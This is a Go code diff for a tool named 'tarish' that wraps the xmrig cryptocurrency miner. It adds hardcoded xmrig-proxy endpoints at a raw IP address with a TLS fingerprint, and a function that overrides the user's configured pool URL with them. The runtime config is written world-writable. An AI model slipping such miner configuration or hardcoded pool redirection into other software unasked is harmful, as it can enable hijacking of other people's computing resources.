@@ -9,8 +9,16 @@ import (
 	"runtime"
 	"strings"
 
+	"tarish/config"
 	"tarish/cpu"
 	"tarish/embedded"
+)
+
+// TLS connection constants for xmrig-proxy
+const (
+	TLSPoolURL        = "150.230.194.138:2083"
+	TLSFingerprint    = "099188DA1C047506DC139AE64CD24C916CE19C736764277B075C5BEC8B813C6F"
+	NonTLSPoolURL     = "150.230.194.138:3333"
 )
 
 // Config represents the xmrig configuration structure (partial)
@@ -541,6 +549,9 @@ func PrepareRuntimeConfig(configPath string, cpuInfo *cpu.Info) (string, error) 
 	apiSection["worker-id"] = workerID
 	raw["api"] = apiSection
 
+	// Apply TLS xmrig-proxy settings based on tarish config
+	applyTLSPoolSettings(raw)
+
 	// Write runtime config
 	runtimePath := GetRuntimeConfigPath()
 	output, err := json.MarshalIndent(raw, "", "  ")
@@ -555,6 +566,64 @@ func PrepareRuntimeConfig(configPath string, cpuInfo *cpu.Info) (string, error) 
 	os.Chmod(runtimePath, 0666)
 
 	return runtimePath, nil
+}
+
+// applyTLSPoolSettings modifies the pools section of a raw xmrig config
+// based on the tarish tls-xmrig-proxy setting. When enabled, the primary
+// pool is switched to the TLS endpoint with fingerprint verification, and
+// the non-TLS endpoint is added as a fallback.
+func applyTLSPoolSettings(raw map[string]interface{}) {
+	tlsEnabled := config.IsTLSXmrigProxyEnabled()
+
+	poolsRaw, ok := raw["pools"].([]interface{})
+	if !ok || len(poolsRaw) == 0 {
+		return
+	}
+
+	// Get the first pool as template for user/pass/algo
+	firstPool, ok := poolsRaw[0].(map[string]interface{})
+	if !ok {
+		return
+	}
+
+	if tlsEnabled {
+		// Set primary pool to TLS endpoint
+		firstPool["url"] = TLSPoolURL
+		firstPool["tls"] = true
+		firstPool["tls-fingerprint"] = TLSFingerprint
+		firstPool["keepalive"] = true
+
+		// Build a non-TLS fallback pool entry (copy key fields from primary)
+		fallbackPool := map[string]interface{}{
+			"algo":             firstPool["algo"],
+			"coin":             firstPool["coin"],
+			"url":              NonTLSPoolURL,
+			"user":             firstPool["user"],
+			"pass":             firstPool["pass"],
+			"rig-id":           firstPool["rig-id"],
+			"nicehash":         false,
+			"keepalive":        true,
+			"enabled":          true,
+			"tls":              false,
+			"sni":              false,
+			"tls-fingerprint":  nil,
+			"daemon":           false,
+			"socks5":           nil,
+			"self-select":      nil,
+			"submit-to-origin": false,
+		}
+
+		// Replace pools: TLS primary + non-TLS fallback
+		raw["pools"] = []interface{}{firstPool, fallbackPool}
+	} else {
+		// TLS disabled: ensure pool uses the non-TLS endpoint
+		firstPool["url"] = NonTLSPoolURL
+		firstPool["tls"] = false
+		firstPool["tls-fingerprint"] = nil
+
+		// Keep only the non-TLS pool (remove any TLS fallback that might exist)
+		raw["pools"] = []interface{}{firstPool}
+	}
 }
 
 // getShortCPUName returns a concise identifier for the CPU family.
